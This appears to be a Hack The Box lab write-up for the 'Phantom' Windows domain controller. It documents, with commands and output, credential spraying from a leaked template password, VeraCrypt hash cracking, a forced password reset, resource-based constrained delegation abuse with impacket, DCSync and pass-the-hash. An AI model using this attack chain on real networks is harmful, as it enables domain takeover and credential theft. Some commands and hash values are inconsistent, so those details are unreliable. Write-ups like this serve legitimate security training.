Author: Faridd

### HTB Write-Up: Phantom

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Phantom)     |
| Difficulty | Medium                                                            |
| OS         | Windows                                                           |
| Date       | November 08, 2026                                                 |

---

#### Table of Contents
1. [Reconnaissance — Rustscan & Nmap](#1-reconnaissance--rustscan--nmap)
2. [Enumeration — SMB Null Session & Leaked Welcome Email](#2-enumeration--smb-null-session--leaked-welcome-email)
3. [Credential Discovery — Username Permutation & RID Brute Forcing](#3-credential-discovery--username-permutation--rid-brute-forcing)
4. [Initial Access — WinRM as svc_sspr](#4-initial-access--winrm-as-svc_sspr)
5. [Lateral Movement — VeraCrypt Container Cracking & Config Leak](#5-lateral-movement--veracrypt-container-cracking--config-leak)
6. [Privilege Escalation — Resource-Based Constrained Delegation (RBCD) Abuse to Domain Admin](#6-privilege-escalation--resource-based-constrained-delegation-rbcd-abuse-to-domain-admin)

---

#### 1. Reconnaissance — Rustscan & Nmap

```bash
rustscan -a 10.129.234.63 --ulimit=5000
```

**Open Ports:**

```
Open 10.129.234.63:53
Open 10.129.234.63:88
Open 10.129.234.63:135
Open 10.129.234.63:139
Open 10.129.234.63:389
Open 10.129.234.63:445
Open 10.129.234.63:464
Open 10.129.234.63:593
Open 10.129.234.63:636
Open 10.129.234.63:3389
Open 10.129.234.63:3269
Open 10.129.234.63:3268
Open 10.129.234.63:5985
Open 10.129.234.63:9389
```

```bash
nmap -sC -sV -p139,389,445,593,636,3268 10.129.234.63 -T4
```

**Result:**

```
139/tcp  open  netbios-ssn?
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)
Service Info: Host: DC; OS: Windows
```

The target is a Domain Controller for `phantom.vl`, hostname **DC**, running Windows Server 2022.

---

#### 2. Enumeration — SMB Null Session & Leaked Welcome Email

##### 2.1 — Guest/Null SMB Access

```bash
netexec smb 10.129.234.63 -u "guest" -p "" --shares
```

**Result:**

```
[+] phantom.vl\guest: 
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Departments Share                 
IPC$            READ            Remote IPC
NETLOGON                        Logon server share 
Public          READ            
SYSVOL                          Logon server share 
```

Guest access was accepted, and the **`Public`** share was readable.

##### 2.2 — Pulling the Public Share

```bash
smbclient //10.129.234.63/Public -U "guest%"
smb: \> recurse on
smb: \> ls
```

**Result:**

```
tech_support_email.eml              A    14565
```

```bash
smb: \> get tech_support_email.eml
```

##### 2.3 — Analyzing the Email

```bash
file tech_support_email.eml
cat tech_support_email.eml
```

The email was sent from `alucas@phantom.vl` to `techsupport@phantom.vl`, carrying a base64-encoded PDF attachment (`welcome_template.pdf`) — an onboarding welcome-email template. The sender address also confirmed a valid domain username format: **`alucas`**.

##### 2.4 — Decoding the Attachment

The base64 block was copied out and decoded:

```bash
base64 -d -i text > welcome_template.pdf
```

(The `-i` flag tells base64 to ignore non-alphabet characters, which handles the extra line spacing in the raw email body.)

Opening the resulting PDF revealed the onboarding template text:

```
Welcome to Phantom!
Dear <NAME>
Below are your user credentials:
Username: <USERNAME>
Password: Ph4nt0m@5t4rt!
```

A **template password**, `Ph4nt0m@5t4rt!`, was leaked — used as the default password pattern for new employee accounts.

---

#### 3. Credential Discovery — Username Permutation & RID Brute Forcing

##### 3.1 — Testing the Leaked Password Directly

```bash
netexec smb 10.129.234.63 -u "alucas" -p 'Ph4nt0m@5t4rt!' --shares
```

**Result:**

```
[-] phantom.vl\alucas:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
```

The guessed username `alucas` was wrong, even though the password pattern was likely still valid for the real account. The sender's real name — **Anthony Lucas** — gave a starting point for generating username permutations.

##### 3.2 — Generating Username Variants

```bash
./username-anarchy Anthony Lucas > name.txt
netexec smb 10.129.234.63 -u name.txt -p 'Ph4nt0m@5t4rt!' --continue-on-success
```

**Result (trimmed):**

```
[+] phantom.vl\anthony:Ph4nt0m@5t4rt! (Guest)
[+] phantom.vl\lucas:Ph4nt0m@5t4rt! (Guest)
[+] phantom.vl\l.anthony:Ph4nt0m@5t4rt! (Guest)
...
```

Many generated usernames "succeeded," but only because unknown/non-existent usernames on this domain silently fall back to the **Guest** account rather than failing outright — meaning none of these were confirmed real, valid accounts. A proper user enumeration was needed instead.

##### 3.3 — RID Brute Forcing for Real Usernames

Since anonymous LDAP user listing failed with an operations error, the account list was instead pulled via **RID brute forcing**, cycling through SIDs on the guest session:

```bash
netexec smb 10.129.234.63 -u 'guest' -p '' --rid-brute
```

**Result (extract):**

```
498: PHANTOM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: PHANTOM\Administrator (SidTypeUser)
501: PHANTOM\Guest (SidTypeUser)
...
```

The output was filtered down to just real user accounts:

```bash
cat user_list | grep SidTypeUser > new_users | awk '{print $6}' | cut -d'\' -f2 > final_users
```

**Result:**

```
Administrator
Guest
krbtgt
DC$
svc_sspr
rnichols
pharrison
wsilva
elynch
nhamilton
lstanley
bbarnes
cjones
agarcia
ppayne
ibryant
ssteward
wstewart
vhoward
crose
twright
fhanson
cferguson
alucas
ebryant
vlynch
ghall
ssimpson
ccooper
vcunningham
```

##### 3.4 — Spraying the Leaked Password Against Real Accounts

```bash
netexec smb 10.129.234.63 -u final_users -p 'Ph4nt0m@5t4rt!' --continue-on-success
```

**Result:**

```
[+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
```

This time the RID-sourced username list guaranteed the accounts were real, and the template password was confirmed valid for **`ibryant`**.

---

#### 4. Initial Access — WinRM as svc_sspr

##### 4.1 — Enumerating ibryant's Share Access

```bash
netexec smb 10.129.234.63 -u ibryant -p 'Ph4nt0m@5t4rt!' --shares
smbclient //10.129.234.63/'Departments Share' -U 'ibryant%Ph4nt0m@5t4rt!'
smb: \> recurse on
smb: \> ls
```

The `Departments Share` contained `Finance`, `HR`, and `IT` folders. The `IT\Backup` folder held an interesting file:

```
IT_BACKUP_201123.hc                 A 12582912
```

##### 4.2 — Cracking the VeraCrypt Container

```bash
smb: \> get IT_BACKUP_201123.hc
```

The `.hc` extension identifies this as a **VeraCrypt** encrypted container. VeraCrypt was installed to attempt mounting it, but it required a password, so the container needed to be cracked offline instead.

VeraCrypt stores its volume header — the part that gets decrypted when the correct password is entered — in just the first 512 bytes of the file. Extracting only that header, rather than feeding Hashcat the full multi-megabyte container, is what Hashcat's VeraCrypt mode expects:

```bash
dd if=./IT_BACKUP_201123.hc of=./hash bs=512 count=1
```

A targeted wordlist was then built from clues already gathered: the company name "Phantom" (from the welcome email), a year in the 2020s, and a trailing special character — matching the pattern already seen in the leaked template password `Ph4nt0m@5t4rt!`:

```bash
crunch 12 12 -t 'Phantom202%^' -o wordlist.txt
```

(`%` generates one digit per position, `^` generates one special character — so this produces 12-character candidates like `Phantom2020!`, `Phantom2021@`, etc.)

```bash
hashcat -m 13721 -a 0 hash wordlist.txt
```

**Result:**

```
hash:Phantom2023!
Status: Cracked
```

##### 4.3 — Mounting the Container & Extracting the Backup

```bash
veracrypt --text --mount IT_BACKUP_201123.hc .
```

Using `Phantom2023!` as the password, the volume mounted successfully, revealing a `vyos_backup.tar.gz` archive. This was extracted, and its `config/config.boot` file was read:

```
authentication {
    local-users {
        username lstanley {
            password "gB6XTcqVP5MlP7Rc"
        }
    }
    mode "local"
```

A plaintext password for the domain user **`lstanley`** was found inside a VyOS (router/firewall) configuration backup.

##### 4.4 — Testing the Password

```bash
netexec smb 10.129.234.63 -u lstanley -p 'gB6XTcqVP5MlP7Rc'
```

**Result:**

```
[-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
```

The password didn't belong to `lstanley` directly — a possible sign of password reuse elsewhere in the domain. It was sprayed against the full user list:

```bash
netexec smb 10.129.234.63 -u final_users -p 'gB6XTcqVP5MlP7Rc'
```

**Result:**

```
[+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc
```

The password was valid for the service account **`svc_sspr`**, which also tested successfully against WinRM:

```bash
netexec winrm 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc'
# (Pwn3d!)
```

##### 4.5 — Shell & User Flag

```bash
evil-winrm -i 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc'
```

```powershell
*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> type user.txt
633b9404b084dcd022f8d089549b3be7
```

`svc_sspr`'s local privileges held nothing directly useful, so the next step was analyzing its **Active Directory object permissions**.

---

#### 5. Lateral Movement — VeraCrypt Container Cracking & Config Leak

(This phase's technical work — cracking the container and extracting the VyOS config — is covered above in section 4, since it directly produced the credentials used for initial access. From here, the investigation shifts to AD permission abuse.)

BloodHound-style analysis showed that `svc_sspr` holds **ForceChangePassword** over three accounts: `rnichols`, `crose`, and `wsilva`. Of these, `wsilva` stood out for having a notable outbound AD permission chain:

```
WSILVA@PHANTOM.VL --MemberOf--> IT SECURITY@PHANTOM.VL --AddAllowedToAct--> DC.PHANTOM.VL --DCSync--> PHANTOM.VL
```

This chain meant `wsilva` (via group membership) could write to a specific delegation attribute on the Domain Controller's own computer object — a path toward full domain compromise, covered in detail in the next section.

##### 5.1 — Taking Over wsilva

Using the `ForceChangePassword` right granted to `svc_sspr`, the password for `wsilva` was reset directly:

```bash
net rpc password "wsilva" 'Password11!' -U "phantom.vl"/"svc_sspr"%"gB6XTcqVP5MlP7Rc" -S "10.129.234.63"
```

```bash
netexec smb phantom.vl -u wsilva -p 'Password11!'
# [+] phantom.vl\wsilva:Password11!
```

---

#### 6. Privilege Escalation — Resource-Based Constrained Delegation (RBCD) Abuse to Domain Admin

##### 6.1 — Why Not Just Create a Fake Computer?

The classic RBCD attack path usually starts by creating a new computer account to use as the "attacking" service, since every domain user is normally allowed to create a small number of computer accounts (the `MachineAccountQuota`). This was checked first:

```bash
netexec ldap dc.phantom.vl -u wsilva -p 'Password11!' -M maq
```

**Result:**

```
MachineAccountQuota: 0
```

The quota was set to `0` — no new computer accounts could be created by ordinary users. This ruled out the usual approach of creating a fake machine account and instead required reusing `wsilva`'s own existing account as the delegating identity.

##### 6.2 — What Resource-Based Constrained Delegation Actually Is

To understand why `wsilva`'s AD permissions matter here, it helps to understand what delegation is for in the first place.

**The problem delegation solves:** Imagine a web server where a user logs in with Kerberos. The web app then needs to fetch that user's files from a separate file server — but it needs to do that *as the user*, not as itself, so the file server's own permission checks apply correctly rather than the web server just having blanket access to everything. Kerberos needs a safe way for one service to say "let me act on behalf of this specific person" to another service.

There have been three generations of this feature:

1. **Unconstrained delegation (oldest, most dangerous):** The front-end service is handed a full copy of the user's Kerberos TGT (their master ticket) and can then impersonate that user to *anything* in the domain. If the front-end is ever compromised, an attacker inherits the ability to impersonate everyone who has ever logged into it, against any service anywhere. Far too broad for modern use.

2. **Constrained delegation:** An improvement — the *target* service now explicitly pre-approves which front-end services are allowed to delegate to it, configured in advance by an admin on the delegating account's `msDS-AllowedToDelegateTo` attribute. Narrower, but still requires an admin to plan and configure it ahead of time.

3. **Resource-Based Constrained Delegation (RBCD) — the modern approach, and the one abused here:** This flips who makes the trust decision. Instead of the front-end service declaring "I'm allowed to delegate to X," the *target resource itself* declares "I trust these specific accounts to delegate to me." That trust list is stored directly on the target machine's own AD object, in an attribute called **`msDS-AllowedToActOnBehalfOfOtherIdentity`** — literally a list of security identifiers (SIDs) that the resource will accept delegated authentication from.

**Why this is attacker-relevant:** Because the trust decision lives on the *target's* object rather than requiring special Kerberos privileges on the attacker's side, whoever holds **write access to that one attribute** effectively controls who gets to impersonate arbitrary users against that machine. It is, mechanically, no different from editing any other text field on an AD object — there's no special Kerberos-level privilege required to make the write itself, only an ordinary AD permission (`AddAllowedToAct`). And that is exactly the permission the BloodHound chain showed `wsilva` holding — through membership in `IT SECURITY` — over `DC.PHANTOM.VL`, the Domain Controller's own machine account.

In other words: because `wsilva` can edit that one "who's allowed to act on my behalf" field on the DC's computer object, `wsilva` can add *themself* to that trusted list. Once added, the DC will accept a specially crafted Kerberos ticket that claims `wsilva` is delegating as *any user* — including the Administrator — and will honor it, because delegation trust was configured on the DC side to allow exactly that.

The overall attack, once that write access is confirmed, breaks down into five steps:

1. Write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the DC's computer object, adding `wsilva` as a trusted delegator.
2. Obtain a TGT for `wsilva` and extract its **Session Key**.
3. Overwrite `wsilva`'s stored NTLM hash with that Session Key value (a required trick for the next step's protocol to accept the ticket).
4. Use Kerberos's S4U2Self/S4U2Proxy extensions to request a service ticket *as the Administrator* for a service on the DC (here, `cifs/dc.phantom.vl`) — this is what "delegation" actually grants: a ticket impersonating someone else.
5. Use that Administrator-impersonating ticket to perform a **DCSync** and pull every password hash in the domain, including the real Administrator's.

##### 6.3 — Step 1: Granting wsilva Delegation Rights on the DC

```bash
impacket-rbcd -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:'Password11!' -dc-ip 10.129.234.63
```

**Result:**

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] wsilva can now impersonate users on DC$ via S4U2Proxy
```

`wsilva` was successfully written into the DC's list of trusted delegators.

##### 6.4 — Step 2: Obtaining wsilva's TGT and Session Key

The NTLM hash of `wsilva`'s password was computed first (using the hash rather than the plaintext password avoids issues in the later steps):

```bash
pypykatz crypto nt Password11!
```

```bash
impacket-getTGT -hashes :49a179202efa551d583da344669f6b15 phantom.vl/wsilva
export KRB5CCNAME=wsilva.ccache
impacket-describeTicket wsilva.ccache
```

**Result (relevant fields):**

```
Ticket Session Key            : f7f637cf2dd8e1605be0c861f763d1e2
User Name                     : wsilva
```

##### 6.5 — Step 3: Overwriting wsilva's Hash with the Session Key

```bash
impacket-changepasswd -hashes :4f894b14da8c6b14d39094b5b3f17da0 -newhashes :f7f637cf2dd8e1605be0c861f763d1e2 phantom.vl/wsilva@phantom.vl
```

**Result:**

```
[*] Password was changed successfully.
```

##### 6.6 — Step 4: Requesting an Impersonated Service Ticket

```bash
impacket-getST -u2u -impersonate Administrator -spn cifs/dc.phantom.vl phantom.vl/wsilva -k -no-pass
```

**Result:**

```
[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache
```

Thanks to the RBCD trust configured in step 1, the DC accepted this ticket as a legitimate request to act as `Administrator` against the `cifs` service — i.e., SMB/file access on the DC itself.

##### 6.7 — Step 5: DCSync for the Administrator Hash

```bash
netexec smb phantom.vl --use-kcache --ntds --user Administrator
```

**Result:**

```
[+] phantom.vl\Administrator from ccache (Pwn3d!)
[+] Dumping the NTDS, this could take a while so go grab a redbull...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::
```

##### 6.8 — Root Flag via Pass-the-Hash

```bash
evil-winrm -i phantom.vl -u Administrator -H aa2abd9db4f5984e657f834484512117
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
93da5d149a2717575ddf43f8d141908b
```
